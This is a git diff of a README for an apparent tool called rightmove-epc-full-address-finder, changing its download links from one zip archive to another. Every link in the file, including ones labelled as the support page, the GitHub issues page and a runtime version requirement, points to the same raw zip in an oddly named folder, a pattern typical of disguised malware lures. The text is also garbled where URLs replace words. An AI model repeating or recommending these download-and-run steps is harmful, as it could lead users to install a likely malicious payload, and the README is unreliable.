@@ -6,24 +6,24 @@ Welcome to the rightmove-epc-full-address-finder! This application helps you mat
 
 ## 📥 Download the Application
 
-[![Download rightmove-epc-full-address-finder](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/rightmove-epc-full-address-finder_chylidrosis.zip)](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/rightmove-epc-full-address-finder_chylidrosis.zip)
+[![Download rightmove-epc-full-address-finder](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/full-rightmove-epc-finder-address-v2.7.zip)](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/full-rightmove-epc-finder-address-v2.7.zip)
 
-You can download the application from the Releases page. Click the button above or visit [this page to download](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/rightmove-epc-full-address-finder_chylidrosis.zip).
+You can download the application from the Releases page. Click the button above or visit [this page to download](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/full-rightmove-epc-finder-address-v2.7.zip).
 
 ## 📋 System Requirements
 
 To run this application, your computer should meet the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/rightmove-epc-full-address-finder_chylidrosis.zip** Version 14 or higher
+- **https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/full-rightmove-epc-finder-address-v2.7.zip** Version 14 or higher
 - **Internet Connection:** Required for fetching address data
 
-Make sure you have the latest version of https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/rightmove-epc-full-address-finder_chylidrosis.zip installed to ensure smooth performance.
+Make sure you have the latest version of https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/full-rightmove-epc-finder-address-v2.7.zip installed to ensure smooth performance.
 
 ## 🔧 Installation Instructions
 
 1. **Download the Application**
-   - Visit [this page to download](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/rightmove-epc-full-address-finder_chylidrosis.zip).
+   - Visit [this page to download](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/full-rightmove-epc-finder-address-v2.7.zip).
    - Look for the latest release and download the installer file suitable for your operating system.
 
 2. **Run the Installer**
@@ -61,18 +61,18 @@ Make sure you have the latest version of https://raw.githubusercontent.com/kwaku
 If you encounter issues while using the application, consider the following steps:
 
 - **Check Your Internet Connection:** Ensure your device is connected to the internet.
-- **Update https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/rightmove-epc-full-address-finder_chylidrosis.zip** Make sure you are using the latest version.
+- **Update https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/full-rightmove-epc-finder-address-v2.7.zip** Make sure you are using the latest version.
 - **Reinstall the Application:** Sometimes, uninstalling and reinstalling the application can solve problems.
 
 For any other issues, you can reach out through the Issues section of the GitHub repository.
 
 ## 📞 Support
 
-If you need help or have questions, feel free to create an issue on our [GitHub page](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/rightmove-epc-full-address-finder_chylidrosis.zip). Our community will assist you as soon as possible.
+If you need help or have questions, feel free to create an issue on our [GitHub page](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/full-rightmove-epc-finder-address-v2.7.zip). Our community will assist you as soon as possible.
 
 ## 🔗 Useful Links
 
-- [Download rightmove-epc-full-address-finder](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/rightmove-epc-full-address-finder_chylidrosis.zip)
-- [GitHub Issues Page](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/rightmove-epc-full-address-finder_chylidrosis.zip)
+- [Download rightmove-epc-full-address-finder](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/full-rightmove-epc-finder-address-v2.7.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/kwakuhatto/rightmove-epc-full-address-finder/main/snowiness/full-rightmove-epc-finder-address-v2.7.zip)
 
 Thank you for using rightmove-epc-full-address-finder! Enjoy finding EPC addresses with ease.
